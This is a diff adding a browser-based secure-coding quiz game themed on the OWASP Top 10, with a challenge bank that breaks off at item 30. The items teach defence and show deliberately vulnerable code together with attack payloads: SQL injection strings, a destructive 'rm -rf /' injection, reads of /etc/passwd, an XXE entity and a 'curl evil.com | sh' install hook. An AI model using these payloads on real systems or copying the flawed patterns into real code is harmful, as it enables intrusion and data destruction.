+@keyframes ptfly{0%{transform:translate(0,0);opacity:1}100%{transform:translate(var(--tx),var(--ty));opacity:0}}
+.xppop{position:fixed;pointer-events:none;z-index:9999;font-family:'Cinzel',serif;font-size:1.4rem;font-weight:700;color:#FFD700;text-shadow:0 0 12px rgba(232,168,32,.9);animation:xppop 1.6s ease-out forwards;}
+@keyframes xppop{0%{opacity:1;transform:translateY(0)}100%{opacity:0;transform:translateY(-80px)}}
+
+/* Dragon overlay */
+#dragon-overlay{position:fixed;inset:0;z-index:9000;pointer-events:none;display:none;background:rgba(0,0,0,0);}
+#dragon-overlay.active{display:block;}
+#dragon-canvas{position:absolute;inset:0;width:100%;height:100%;}
+.dragon-text{position:absolute;top:42%;left:50%;transform:translate(-50%,-50%);font-family:'Uncial Antiqua',serif;font-size:clamp(2rem,5vw,3.2rem);color:#FF4400;text-shadow:0 0 30px rgba(255,100,0,.9),0 0 60px rgba(255,0,0,.5),0 0 100px rgba(255,0,0,.3);text-align:center;opacity:0;transition:opacity .5s;pointer-events:none;white-space:nowrap;}
+.dragon-text.show{opacity:1;}
+@keyframes screenShake{0%,100%{transform:translate(0,0)}20%{transform:translate(-8px,4px)}40%{transform:translate(8px,-4px)}60%{transform:translate(-5px,5px)}80%{transform:translate(5px,-3px)}}
+</style>
+</head>
+<body>
+
+<!-- ── INTRO ── -->
+<div id="intro">
+  <canvas id="intro-canvas"></canvas>
+  <div id="intro-stars"></div>
+  <span class="intro-skip" onclick="skipIntro()">Skip ▶</span>
+  <div id="intro-content">
+    <div class="intro-slide active" id="slide-0">
+      <div class="intro-emoji">⚔️</div>
+      <div class="intro-title">Security Knights</div>
+      <div class="intro-sub">A quest for secure code</div>
+      <div class="intro-progress"><div class="intro-dot active"></div><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot"></div></div>
+      <button class="intro-btn" onclick="nextSlide()">Next →</button>
+    </div>
+    <div class="intro-slide" id="slide-1">
+      <div class="intro-emoji">🌑</div>
+      <div class="intro-story">In the realm of <strong>Codehaven</strong>, dark sorcerers exploit the <em>vulnerabilities</em> of unsuspecting applications — stealing secrets, corrupting data, and plunging the kingdom into chaos...</div>
+      <div class="intro-progress"><div class="intro-dot"></div><div class="intro-dot active"></div><div class="intro-dot"></div><div class="intro-dot"></div></div>
+      <button class="intro-btn" onclick="nextSlide()">Next →</button>
+    </div>
+    <div class="intro-slide" id="slide-2">
+      <div class="intro-emoji">🛡️</div>
+      <div class="intro-story">The <strong>Council of Knights</strong> has summoned you — a warrior trained in the ancient art of <em>secure coding</em>. Walk the sacred path, answer each challenge, and <strong>protect the realm</strong>.</div>
+      <div class="intro-progress"><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot active"></div><div class="intro-dot"></div></div>
+      <button class="intro-btn" onclick="nextSlide()">Next →</button>
+    </div>
+    <div class="intro-slide" id="slide-3">
+      <div class="intro-emoji">🏰</div>
+      <div class="intro-story">Fifteen stepping stones stand between you and the <strong>Shadow Castle</strong>. Each stone guards a secret of the <em>OWASP Top 10</em>. Answer correctly and advance. The realm is counting on you.</div>
+      <div class="intro-progress"><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot"></div><div class="intro-dot active"></div></div>
+      <button class="intro-btn" onclick="startIntro()">⚔️ Begin Your Quest</button>
+    </div>
+  </div>
+</div>
+
+<!-- ── DRAGON OVERLAY ── -->
+<div id="dragon-overlay">
+  <canvas id="dragon-canvas"></canvas>
+  <div class="dragon-text" id="dragon-text">🐉 The Dragon Strikes!<br><span style="font-size:55%;color:#FF8844;font-family:'Cinzel',serif">Study the explanation and continue your quest!</span></div>
+</div>
+
+
+
+<!-- ── PATH SELECTION ── -->
+<div id="pathModal">
+  <div class="path-title">⚔️ Choose Your Path ⚔️</div>
+  <div class="path-sub">Will you face the shadows alone, or band together with an Order of Knights to conquer the realm?</div>
+  <div class="path-cards">
+    <div class="path-card solo" onclick="choosePath('solo')">
+      <div class="path-card-glow"></div>
+      <span class="path-icon">🗡️</span>
+      <div class="path-card-title">Solo Quest</div>
+      <div class="path-card-desc">Walk the path alone. Earn XP, defeat challenges, and claim your rank through personal mastery. Your progress, your glory.</div>
+      <div class="path-card-tag">
+        <span class="path-tag">15 Challenges</span>
+        <span class="path-tag">Personal XP</span>
+        <span class="path-tag">3 Ranks</span>
+        <span class="path-tag">Certificate</span>
+      </div>
+      <button class="path-card-btn">Enter as a Lone Knight →</button>
+    </div>
+    <div class="path-card order" onclick="choosePath('order')">
+      <div class="path-card-glow"></div>
+      <span class="path-icon">⚔️</span>
+      <div class="path-card-title">Join an Order</div>
+      <div class="path-card-desc">Form or join a guild. Pool your knowledge in Weekly Sieges, climb the Order leaderboard, and control the realm together.</div>
+      <div class="path-card-tag">
+        <span class="path-tag">Guild System</span>
+        <span class="path-tag">Weekly Sieges</span>
+        <span class="path-tag">Territory Wars</span>
+        <span class="path-tag">Order XP</span>
+      </div>
+      <button class="path-card-btn">Form an Order →</button>
+    </div>
+  </div>
+</div>
+
+<!-- ── ORDER CREATION ── -->
+<div id="orderCreateModal">
+  <div class="ocm-card">
+    <div class="ocm-title">⚔️ Found Your Order</div>
+    <div class="ocm-sub">Name your guild, choose your banner colour, and set your motto.</div>
+
+    <label class="ocm-label">Order Name</label>
+    <input type="text" class="ocm-input" id="orderNameInput" placeholder="e.g. The Iron Coders" maxlength="28" oninput="updateOrderPreview()"/>
+
+    <label class="ocm-label">Banner Colour</label>
+    <div class="color-row" id="colorRow"></div>
+
+    <label class="ocm-label">Order Motto</label>
+    <input type="text" class="ocm-input" id="orderMottoInput" placeholder="e.g. Secure by default, defended by honour" maxlength="50" oninput="updateOrderPreview()"/>
+
+    <div class="ocm-preview">
+      <div class="ocm-preview-name" id="previewName" style="color:#E8A820">⚔️ The Iron Coders</div>
+      <div class="ocm-preview-motto" id="previewMotto">"Secure by default, defended by honour"</div>
+    </div>
+
+    <div class="ocm-actions">
+      <button class="bgold" style="flex:1;padding:10px;border-radius:8px;font-size:.85rem;" onclick="foundOrder()">⚔️ Found this Order</button>
+      <button class="bghost" style="padding:10px 14px;border-radius:8px;font-size:.85rem;" onclick="goBack()">← Back</button>
+    </div>
+  </div>
+</div>
+
+<!-- ── SHARE BADGE MODAL ── -->
+<div id="shareModal">
+  <div class="share-wrap" style="position:relative">
+    <button class="share-close" onclick="document.getElementById('shareModal').classList.remove('open')">✕</button>
+    <h3>⚔️ YOUR SECURITY KNIGHT CERTIFICATE ⚔️</h3>
+    <canvas id="badgeCanvas" width="900" height="500"></canvas>
+    <div class="share-actions">
+      <button class="share-btn share-dl" onclick="downloadBadge()">⬇ Download PNG</button>
+      <button class="share-btn share-ln" onclick="shareLinkedIn()">in LinkedIn</button>
+      <button class="share-btn share-cp" id="cpyBtn" onclick="copyShareText()">📋 Copy Text</button>
+    </div>
+  </div>
+</div>
+
+<!-- ── API KEY MODAL ── -->
+<div class="overlay" id="keyModal">
+  <div class="mcard">
+    <h2>The Wizard Awaits</h2>
+    <p>Enter your Anthropic API key to unlock Merlin — or begin in <strong style="color:var(--gold)">demo mode</strong> (full game access, pre-written hints).</p>
+    <input type="password" class="minput" id="modalKey" placeholder="sk-ant-api03-..." autocomplete="off"/>
+    <p class="mnote">🔒 Stored in sessionStorage only — clears when tab closes</p>
+    <div class="macts">
+      <button class="bgold" id="btnSave">Enter the Castle</button>
+      <button class="bghost" id="btnDemo">Demo Mode (Full Access)</button>
+    </div>
+  </div>
+</div>
+
+<!-- ── BADGE MODAL ── -->
+<div class="bdgoverlay hidden" id="bdgModal">
+  <div class="bdgcard">
+    <span class="bdgemoji" id="bdgEmoji">🏅</span>
+    <h2 id="bdgTitle">Badge Earned!</h2>
+    <p id="bdgDesc">You have proven your worth.</p>
+    <button class="bdgclose" id="bdgClose">Continue Quest</button>
+  </div>
+</div>
+
+<!-- ── HUD ── -->
+<div id="hud">
+  <div class="hud-left">
+    <a href="security-knights.html" class="nav-a back-btn">← Back</a>
+    <div class="hud-logo">⚔️ Security Knights</div>
+    <a href="index.html" class="nav-a">🏠</a>
+    <a href="projects.html" class="nav-a">📁</a>
+  </div>
+  <div class="hud-center">
+    <div class="rbadge rp" id="rankBadge">🛡️ Paige</div>
+    <div class="xpw">
+      <div class="xplbl"><span>XP</span><span id="xpLbl">0/200</span></div>
+      <div class="xpbar"><div class="xpfill" id="xpFill" style="width:0%"></div></div>
+    </div>
+    <div class="bdgs">
+      <div class="bicon" id="bp" title="Paige Badge">🛡️</div>
+      <div class="bicon" id="bs" title="Squire Badge">⚔️</div>
+      <div class="bicon" id="bk" title="Knight Badge">👑</div>
+    </div>
+    <div id="missDots" style="display:flex;gap:5px;align-items:center;margin-left:6px;" title="Wrong answers — 3 = defeat!">
+      <div class="miss-dot" id="md1"></div>
+      <div class="miss-dot" id="md2"></div>
+      <div class="miss-dot" id="md3"></div>
+    </div>
+  </div>
+  <div class="hud-right">
+    <button class="hud-btn" id="btnQuests" onclick="toggleSidebar()">📜 Quests</button>
+    <button class="hud-btn" id="btnWiz" onclick="toggleWizard()">🧙 Wizard</button>
+    <button class="hud-btn" onclick="openShareCard()" title="Get your certificate">🏅</button>
+    <button class="hud-btn" id="btnMute" onclick="toggleMusic()">🔊</button>
+  </div>
+</div>
+
+<!-- ── LAYOUT ── -->
+<div id="layout">
+  <!-- Left sidebar -->
+  <div id="sidebar-left">
+    <div class="sb-tabs" id="sbTabs">
+      <button class="sb-tab active" data-panel="sbQuests" onclick="switchSbTab(this)">📜 Quests</button>
+      <button class="sb-tab" data-panel="sbOrder" id="sbOrderTab" onclick="switchSbTab(this)" style="display:none">⚔️ Order</button>
+      <button class="sb-tab" data-panel="sbSiege" id="sbSiegeTab" onclick="switchSbTab(this)" style="display:none">🏰 Siege</button>
+    </div>
+
+    <!-- QUEST BOARD PANEL -->
+    <div class="sb-panel active" id="sbQuests">
+      <div id="sb-inner" style="padding:10px;overflow-y:auto;flex:1;">
+        <div class="sb-tier">
+          <div class="sb-tier-hdr">
+            <div class="sb-tier-name" style="color:var(--pc)">🛡️ Paige</div>
+            <div class="sb-tier-cnt" id="pcnt">0/5</div>
+          </div>
+          <div id="pquests"></div>
+        </div>
+        <div class="sb-tier">
+          <div class="sb-tier-hdr">
+            <div class="sb-tier-name" style="color:var(--sc)">⚔️ Squire</div>
+            <div class="sb-tier-cnt" id="scnt">0/5</div>
+          </div>
+          <div id="squests"></div>
+        </div>
+        <div class="sb-tier">
+          <div class="sb-tier-hdr">
+            <div class="sb-tier-name" style="color:var(--kc)">👑 Knight</div>
+            <div class="sb-tier-cnt" id="kcnt">0/5</div>
+          </div>
+          <div id="kquests"></div>
+        </div>
+        <button class="sb-reset" onclick="resetGame()">↺ Reset Progress</button>
+      </div>
+    </div>
+
+    <!-- ORDER PANEL -->
+    <div class="sb-panel" id="sbOrder">
+      <div class="order-banner" id="orderBannerEl">
+        <div class="order-name-display" id="orderNameEl">⚔️ My Order</div>
+        <div class="order-motto-display" id="orderMottoEl">Loading...</div>
+      </div>
+      <div class="order-stats">
+        <div class="order-stat"><div class="order-stat-val" id="orderTotalXP">0</div><div class="order-stat-lbl">Order XP</div></div>
+        <div class="order-stat"><div class="order-stat-val" id="orderRankEl">#1</div><div class="order-stat-lbl">Realm Rank</div></div>
+        <div class="order-stat"><div class="order-stat-val" id="orderMemberCount">1</div><div class="order-stat-lbl">Members</div></div>
+        <div class="order-stat"><div class="order-stat-val" id="orderZone">—</div><div class="order-stat-lbl">Zones Held</div></div>
+      </div>
+      <div class="order-members">
+        <div class="om-title">📋 Members</div>
+        <div id="membersList"></div>
+      </div>
+    </div>
+
+    <!-- SIEGE PANEL -->
+    <div class="sb-panel" id="sbSiege">
+      <div class="siege-panel">
+        <div class="siege-header">
+          <span class="siege-icon">🔥</span>
+          <div class="siege-title">Weekly Siege</div>
+          <div class="siege-sub" id="siegeEventName">The Shadow Sorcerer's Challenge</div>
+        </div>
+        <div class="siege-timer">
+          <div class="siege-timer-val" id="siegeTimerVal">06:14:22</div>
+          <div class="siege-timer-lbl">Until siege ends</div>
+        </div>
+        <div class="siege-leaderboard">
+          <div class="siege-lb-title">🏆 Order Standings</div>
+          <div id="siegeLeaderboard"></div>
+        </div>
+        <div id="siegeAction"></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Map -->
+  <div id="map-area">
+    <canvas id="gc"></canvas>
+    <div id="qpanel">
+      <div class="qp-hdr">
+        <div>
+          <div class="qp-tag" id="qpTag">⚔️ Challenge</div>
+          <div style="font-size:10px;color:var(--muted);font-family:'JetBrains Mono',monospace;margin-top:3px;" id="qpSub"></div>
+        </div>
+        <div class="qp-xp" id="qpXp">+0 XP</div>
+      </div>
+      <div class="qp-title" id="qpTitle"></div>
+      <div class="qp-body" id="qpBody"></div>
+      <div class="codebox" id="qpCode" style="display:none"></div>
+      <div class="opts" id="qpOpts"></div>
+      <div class="expl" id="qpExpl"></div>
+      <button class="nxt" id="nxtBtn" onclick="onNext()">Continue Quest →</button>
+    </div>
+  </div>
+
+  <!-- Wizard -->
+  <div id="wpanel">
+    <div class="whdr">
+      <div class="wav">🧙</div>
+      <div><div class="wname">Merlin the Wizard</div><div class="wsub">Ask me anything</div></div>
+    </div>
+    <div class="wmsgs" id="wmsgs">
+      <div class="wm wiz"><strong>Greetings!</strong> I am Merlin. I shall guide you through the realm — ask for hints, explanations, or real-world examples! 🧙✨</div>
+    </div>
+    <div class="hints">
+      <button class="hbtn" data-hint="hint">💡 Hint</button>
+      <button class="hbtn" data-hint="explain">📖 Explain</button>
+      <button class="hbtn" data-hint="realworld">🌍 Real example</button>
+      <button class="hbtn" data-hint="prevent">🛡️ Prevention</button>
+    </div>
+    <div class="winput-wrap">
+      <div class="winput-row">
+        <input type="text" class="winput" id="winput" placeholder="Ask the wizard…" autocomplete="off"/>
+        <button class="wsend" id="wsend">➤</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+// ═══════════════════════════════════════════════
+// CHALLENGE BANK (10 per tier, 5 chosen randomly)
+// ═══════════════════════════════════════════════
+var ALL_CHALLENGES = {
+paige: [
+  {id:1,xp:10,topic:'SQL Injection',title:'The Poisoned Scroll',
+   body:"A library lets visitors search scrolls by name. Look at the code. What is the vulnerability?",
+   code:'const query = "SELECT * FROM scrolls\n  WHERE title = \'" + userInput + "\'";\ndb.execute(query);',
+   options:['Missing input validation on title','SQL Injection — user input concatenated directly into the query','Database connection is unencrypted','Query selects too many columns'],
+   correct:1,explanation:'Classic SQL Injection! An attacker inputs: \' OR 1=1-- to return all rows, or \'; DROP TABLE scrolls;-- to destroy the database. Fix: always use parameterized queries / prepared statements.'},
+  {id:2,xp:10,topic:'XSS',title:'The Enchanted Message Board',
+   body:"The village board renders messages this way. What dark magic lurks?",
+   code:'// Displaying the message\nmessageDiv.innerHTML = userMessage; // from form input',
+   options:['The code uses innerHTML instead of textContent','Missing authentication check','Variable name is too short','The page loads too slowly'],
+   correct:0,explanation:'innerHTML with user input enables XSS. An attacker injects script tags and it runs in every browser. Fix: use textContent, or sanitize with DOMPurify.'},
+  {id:3,xp:10,topic:'Password Storage',title:'The Vault of Secrets',
+   body:"The castle stores passwords. Which storage method is most dangerous?",
+   code:'',
+   options:['Hashed with bcrypt (cost 12)','Hashed with SHA-256','Stored as plain text in the database','Hashed with Argon2id'],
+   correct:2,explanation:'Plain text passwords mean a single database breach exposes everyone. Use bcrypt or Argon2id — never plain text, and avoid fast hashes like MD5/SHA-256 for passwords.'},
+  {id:4,xp:15,topic:'Hardcoded Credentials',title:'The Open Gate',
+   body:"The castle gate checks identity with this spell. Spot the critical flaw:",
+   code:'if (username === "admin" && password === "password123") {\n  grantAccess();\n}',
+   options:['The condition uses === instead of ==','Hardcoded credentials visible in source code','Function name is misleading','Missing a return statement'],
+   correct:1,explanation:'Hardcoded credentials are catastrophic — anyone who reads the source code gains admin access. Credentials belong in environment variables or a secrets manager, never in code.'},
+  {id:5,xp:15,topic:'HTTPS',title:'The Secret Messenger',
+   body:"A knight sends credentials across the network. Which path is safe?",
+   code:'',
+   options:['HTTP — readable across the network','HTTPS — encrypted in a sealed chest (TLS)','FTP — the fastest courier','Credentials are always safe on local networks'],
+   correct:1,explanation:'HTTP transmits data in plain text — any network spy can read it. HTTPS encrypts the connection with TLS. Never transmit credentials over HTTP.'},
+  {id:6,xp:10,topic:'Input Validation',title:'The Cursed Form',
+   body:"A registration form accepts a username without validation. What is the most dangerous consequence?",
+   code:'app.post("/register", (req, res) => {\n  var user = req.body.username; // no validation\n  db.query("INSERT INTO users (name) VALUES (\'" + user + "\')");\n});',
+   options:['Users might enter funny names','Injection attacks via the username field','The form submits too slowly','Missing a CAPTCHA'],
+   correct:1,explanation:'Without validation, an attacker can inject SQL or scripts via the username field. Always validate and sanitize ALL user inputs before processing them.'},
+  {id:7,xp:10,topic:'Session Management',title:'The Stolen Token',
+   body:"After login, the server issues a session token. Which practice is most dangerous?",
+   code:'',
+   options:['Using HttpOnly cookies','Storing session tokens in localStorage','Regenerating session ID after login','Using Secure flag on cookies'],
+   correct:1,explanation:'localStorage is accessible by JavaScript — any XSS attack can steal it. Store session tokens in HttpOnly cookies so JavaScript cannot access them at all.'},
+  {id:8,xp:10,topic:'Error Messages',title:'The Revealing Oracle',
+   body:"A login form returns this error. What security problem does this create?",
+   code:'// When username found but password wrong:\nreturn "Incorrect password for user admin@castle.com";\n// When username not found:\nreturn "User not found";',
+   options:['Too many characters in the message','User enumeration — reveals which accounts exist','The error is not logged','Missing a CAPTCHA'],
+   correct:1,explanation:'Different error messages for wrong username vs wrong password let attackers enumerate valid accounts. Always return a generic message like "Invalid username or password".'},
+  {id:9,xp:15,topic:'Path Traversal',title:'The Hidden Dungeon',
+   body:"A file server lets users download files by name. What danger lurks?",
+   code:'app.get("/download", (req, res) => {\n  var file = req.query.name; // e.g. "report.pdf"\n  res.sendFile(__dirname + "/files/" + file);\n});',
+   options:['Files download too slowly','Path traversal — attacker uses ../../etc/passwd to read server files','Missing file type check','No authentication on the route'],
+   correct:1,explanation:'Without path validation, an attacker passes ../../etc/passwd to read arbitrary server files. Fix: use path.resolve() and verify the result is within your allowed directory.'},
+  {id:10,xp:15,topic:'Command Injection',title:"The Sorcerer's Command",
+   body:"The castle runs system commands with user input. What is the vulnerability?",
+   code:'const { exec } = require("child_process");\napp.get("/ping", (req, res) => {\n  exec("ping " + req.query.host, (err, out) => res.send(out));\n});',
+   options:['ping command is too slow','Command injection — attacker adds ; rm -rf / to the host param','Missing error handling','Network permission issue'],
+   correct:1,explanation:'Concatenating user input into shell commands allows command injection. An attacker passes "8.8.8.8; cat /etc/passwd" to run arbitrary commands. Fix: use execFile with argument arrays, never exec with string concatenation.'}
+],
+
+squire: [
+  {id:11,xp:20,topic:'CSRF',title:'The Forged Royal Decree',
+   body:"A knight visits an evil page that silently transfers gold on their behalf. What is this attack?",
+   code:"<!-- On the evil website -->\n<img src=\"https://royalbank.com/transfer?to=evil&amount=1000\"\n     style=\"display:none\" />",
+   options:['SQL Injection targeting the bank','Cross-Site Request Forgery (CSRF)','Cross-Site Scripting (XSS)','Man-in-the-Middle Attack'],
+   correct:1,explanation:'CSRF tricks the browser into sending authenticated requests the user never intended. The browser automatically includes cookies. Fix: CSRF tokens (secret random values validated server-side) and SameSite cookie attributes.'},
+  {id:12,xp:20,topic:'IDOR',title:'The Stolen Key',
+   body:"Knight Alice requests another knight's private documents. What flaw is this?",
+   code:'GET /api/documents/12345\nAuthorization: Bearer alice_token\n// Returns Bob\'s private documents!',
+   options:['Rate limiting — too many requests','Insecure Direct Object Reference (IDOR) — no authorization check','SQL Injection in the document ID','Missing HTTPS'],
+   correct:1,explanation:'IDOR is a broken access control flaw. The server verifies WHO you are (authentication) but not whether you\'re ALLOWED to access that specific resource (authorization). Always check per-object permissions.'},
+  {id:13,xp:25,topic:'Cryptography',title:'The Weak Cipher',
+   body:"Which password hashing choice would horrify the security council?",
+   code:'',
+   options:['bcrypt with cost factor 12','Argon2id with memory 64MB','MD5 — fast and widely supported','scrypt with N=32768'],
+   correct:2,explanation:'MD5 is a fast hashing algorithm. GPUs crack MD5 hashes at ~200 billion per second. Use slow algorithms (bcrypt, Argon2, scrypt) — deliberately expensive so brute-force takes years.'},
+  {id:14,xp:20,topic:'File Upload',title:'The Trojan Scroll',
+   body:"An attacker uploads a file named evil.php. What is the correct defense?",
+   code:'app.post("/upload", (req, res) => {\n  var name = req.file.originalname; // "evil.php"\n  fs.writeFileSync("./uploads/" + name, req.file.buffer);\n  res.send("Uploaded!");\n});',
+   options:['Only check the file extension','Validate MIME type from Content-Type only','Validate by magic bytes, restrict extensions, store outside web root, rename files','Limit size to under 10MB'],
+   correct:2,explanation:'Checking only extensions is trivially bypassed (rename evil.php to evil.jpg). Proper defenses: validate content via magic bytes, whitelist extensions, store outside web root, and rename files to random UUIDs.'},
+  {id:15,xp:25,topic:'Security Headers',title:'The Missing Shield',
+   body:"Which HTTP response header controls which scripts can execute — blocking most XSS?",
+   code:'',
+   options:['X-Frame-Options','Strict-Transport-Security (HSTS)','Content-Security-Policy (CSP)','X-Content-Type-Options'],
+   correct:2,explanation:'CSP tells the browser which sources are trusted. A strong CSP like default-src \'self\' blocks inline scripts and third-party injections, drastically reducing XSS impact.'},
+  {id:16,xp:20,topic:'SSRF',title:'The Dark Portal',
+   body:"A knight can request any URL from the castle server. What attack does this enable?",
+   code:'app.get("/fetch", async (req, res) => {\n  var url = req.query.url; // any URL!\n  var data = await axios.get(url);\n  res.json(data.data);\n});',
+   options:['XSS via the fetched URL','SSRF — attacker can reach internal services like http://169.254.169.254','SQL Injection via URL','Rate limiting issue'],
+   correct:1,explanation:'SSRF (Server-Side Request Forgery) lets attackers make the server request internal resources — like cloud metadata endpoints (AWS IMDSv1) that expose credentials. Fix: validate and allowlist URLs, block internal IP ranges.'},
+  {id:17,xp:20,topic:'Insecure Deserialization',title:'The Cursed Object',
+   body:"The castle sends this serialized cookie to the client and trusts it on return. What happens?",
+   code:'// Server sets cookie:\nres.cookie("session", serialize({role:"user", id:42}));\n// On next request, server deserializes and trusts it:\nvar data = deserialize(req.cookies.session); // dangerous!',
+   options:['Cookie is too long','Insecure deserialization — attacker modifies the cookie to become admin','Missing HttpOnly flag','Cookie will expire'],
+   correct:1,explanation:'If you serialize data, send it to the client, and deserialize it on return without verification, the attacker can modify it. Always sign serialized data (HMAC) and verify the signature before deserializing.'},
+  {id:18,xp:25,topic:'API Security',title:'The Unguarded Gate',
+   body:"An API endpoint returns all user records. What is the most critical issue?",
+   code:'GET /api/users\n// Returns: [{id:1,name:"Alice",email:"...",password_hash:"..."}]\n// No authentication required',
+   options:['The response is too large','No authentication + exposing password hashes to anyone','Missing pagination','API version not specified'],
+   correct:1,explanation:'This endpoint has two critical issues: no authentication lets anyone call it, and returning password hashes gives attackers a head start on cracking. Always authenticate APIs and never expose sensitive fields.'},
+  {id:19,xp:20,topic:'Mass Assignment',title:'The Overloaded Spell',
+   body:"A user registration endpoint automatically assigns all request body fields. What can go wrong?",
+   code:'app.post("/register", async (req, res) => {\n  var user = await User.create(req.body); // assigns EVERYTHING!\n  res.json(user);\n});',
+   options:['Too many fields slow the server','Mass assignment — attacker adds isAdmin:true to become admin','Missing email validation','Password not hashed'],
+   correct:1,explanation:'Mass assignment lets attackers set fields they should not control (like isAdmin, role, or verified). Always use an explicit allowlist of fields: only assign the specific fields you expect from user input.'},
+  {id:20,xp:25,topic:'Rate Limiting',title:'The Endless Army',
+   body:"A login endpoint has no rate limiting. What attack does this enable?",
+   code:'app.post("/login", async (req, res) => {\n  // No rate limiting!\n  var user = await checkCredentials(req.body.user, req.body.pass);\n  if (user) res.json({token: generateToken(user)});\n  else res.status(401).json({error: "Invalid"});\n});',
+   options:['Password hashing is too slow','Credential stuffing and brute-force attacks — unlimited attempts','Missing HTTPS','CORS issue'],
+   correct:1,explanation:'Without rate limiting, attackers can try millions of password combinations (brute-force) or use stolen credential lists (credential stuffing). Fix: limit login attempts, add CAPTCHA, implement account lockout, and use IP-based throttling.'}
+],
+
+knight: [
+  {id:21,xp:30,topic:'JWT Security',title:'The Forged Sigil',
+   body:'A sorcerer changes the JWT algorithm to "none". What catastrophe occurs?',
+   code:'// Original JWT header:\n{ "alg": "HS256", "typ": "JWT" }\n\n// Attacker modified:\n{ "alg": "none", "typ": "JWT" }\n// Payload: { "role": "admin" } — no signature!',
+   options:['Server rejects the unsigned token','Token expires faster','Vulnerable server accepts it with no signature — granting admin access','JWT becomes larger'],
+   correct:2,explanation:'The alg:none attack exploits libraries that skip signature verification. Fix: explicitly reject alg:none server-side, pin the expected algorithm, never trust the algorithm field from the token itself.'},
+  {id:22,xp:30,topic:'Race Conditions',title:'The Twin Swords',
+   body:"Two knights simultaneously request the last 100 gold. Both pass the balance check. What occurs?",
+   code:'async function withdraw(amount) {\n  const balance = await getBalance(); // Both read: 100\n  if (balance >= amount) {\n    await deductBalance(amount);       // Both deduct 100!\n    return "Success";                  // Treasury: -100\n  }\n}',
+   options:['SQL Injection in deductBalance','Race condition — both pass the check before either deducts','Missing authentication','async/await pattern is broken'],
+   correct:1,explanation:'This TOCTOU race condition allows double-spending. Fix: database transactions with row-level locking (SELECT FOR UPDATE) or optimistic locking with version numbers.'},
+  {id:23,xp:35,topic:'XXE',title:'The Ancient Scroll Parser',
+   body:"The castle XML parser processes this document. What can an attacker read?",
+   code:'<?xml version="1.0"?>\n<!DOCTYPE data [\n  <!ENTITY secret SYSTEM "file:///etc/passwd">\n]>\n<request>\n  <data>&secret;</data>\n</request>',
+   options:['XSS via XML in browser','XXE — reads arbitrary files from the server','CSRF via XML','SQL Injection in the XML'],
+   correct:1,explanation:'XML External Entity (XXE) attacks abuse XML parsers to read local files or hit internal services. Fix: disable external entity processing (FEATURE_SECURE_PROCESSING in most parsers).'},
+  {id:24,xp:30,topic:'Dependencies',title:'The Cursed Artifact',
+   body:"The castle uses a library with 3 critical CVEs from 4 years ago. What is the primary risk?",
+   code:'"dependencies": {\n  "ancient-spell-lib": "^1.0.0",  // CVE-2019-XXXX critical\n  "medieval-crypto": "0.0.1"       // Unmaintained since 2020\n}',
+   options:['Library name is not descriptive','^ allows minor version updates','Known CVEs can be exploited through your application','Breaking changes may occur'],
+   correct:2,explanation:'OWASP A06: Using Components with Known Vulnerabilities. A CVE in a dependency can be exploited through your app even if your code is perfect. Use npm audit, Snyk, or Dependabot — always patch promptly.'},
+  {id:25,xp:35,topic:'Logging & Monitoring',title:'The Silent Watchtower',
+   body:"An attack went undetected for 72 hours. Logs show it — but nobody was alerted. Which OWASP category failed?",
+   code:'// Event log:\n[03:42] Login failed x 500  <- no alert triggered\n[03:43] Admin account accessed\n[03:44] 50,000 records exported\n// First alert: 72 hours later',
+   options:['Broken Access Control','Security Misconfiguration','Security Logging and Monitoring Failures','Cryptographic Failures'],
+   correct:2,explanation:'OWASP A09: 500 failed logins should trigger an immediate alert. Best practices: log all auth events, alert on anomalies, retain logs 90+ days, and regularly test your detection capability.'},
+  {id:26,xp:30,topic:'Supply Chain',title:'The Poisoned Well',
+   body:"The castle installs a popular npm package that was secretly updated with malicious code. What attack is this?",
+   code:'// npm install helpful-utils\n// Version 1.2.3 looks fine...\n// Version 1.2.4 (auto-update) contains:\nexec("curl evil.com | sh"); // runs on install!',
+   options:['XSS via npm package','Supply chain attack — malicious code injected into a trusted dependency','SQL Injection via npm','CSRF from the package'],
+   correct:1,explanation:'Supply chain attacks target the software build process. Fix: pin exact dependency versions, use lockfiles, audit packages before installing, use tools like Socket or Snyk to monitor for malicious packages.'},
+  {id:27,xp:30,topic:'CORS',title:'The Open Drawbridge',
+   body:"The castle API returns this header. What is the security problem?",
+   code:'// API response header:\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n\n// Browser receives user\'s private data...',
+   options:['Header is too long','Wildcard CORS with credentials — any site can read authenticated responses','Missing HTTPS','Cookie is not set'],
+   correct:1,explanation:'CORS with both wildcard origin (*) and credentials:true is rejected by browsers — but a misconfigured server might reflect the Origin header. Always use specific allowlisted origins, never * with credentials.'},
+  {id:28,xp:35,topic:'Prototype Pollution',title:'The Corrupted Lineage',
+   body:"A library merges user-provided JSON into an object. What vulnerability exists?",
+   code:'function merge(target, src) {\n  for (var key in src) {\n    if (typeof src[key] === "object")\n      merge(target[key], src[key]);\n    else\n      target[key] = src[key];\n  }\n}\nmerge({}, JSON.parse(userInput)); // attacker sends __proto__',
+   options:['JSON parsing is too slow','Prototype pollution — attacker sets __proto__ to corrupt all objects','XSS via JSON','SQL Injection via JSON'],
+   correct:1,explanation:'Prototype pollution lets attackers inject properties into Object.prototype, affecting all objects in the app. Fix: block __proto__ and constructor.prototype keys, use Object.create(null) for data maps, or use structured-clone.'},
+  {id:29,xp:35,topic:'ReDoS',title:'The Infinite Labyrinth',
+   body:"The castle uses this regex to validate emails. What attack can freeze the server?",
+   code:'// Email validation regex\nvar emailRegex = /^([a-zA-Z0-9]+)*@domain\\.com$/;\n// Test: "aaaaaaaaaaaaaaaaaaaaaaaaaaaa@" — hangs for seconds!',
+   options:['Regex is too strict','ReDoS — evil input causes catastrophic backtracking, hanging the server','Missing case-insensitive flag','Regex does not handle subdomains'],
+   correct:1,explanation:'ReDoS (Regular Expression Denial of Service) exploits catastrophic backtracking in certain regex patterns. Fix: use linear-time regex engines, or test regexes with tools like safe-regex to detect vulnerable patterns.'},
+  {id:30,xp:30,topic:'Memory Safety',title:'The Leaking Fortress',
+   body:"Which coding practice creates the most dangerous memory vulnerabilities in C/C++ systems?",
+   code:'char buffer[64];\nsprintf(buffer, userInput); // no length limit!\n// If userInput > 64 chars: stack corruption, code execution!',
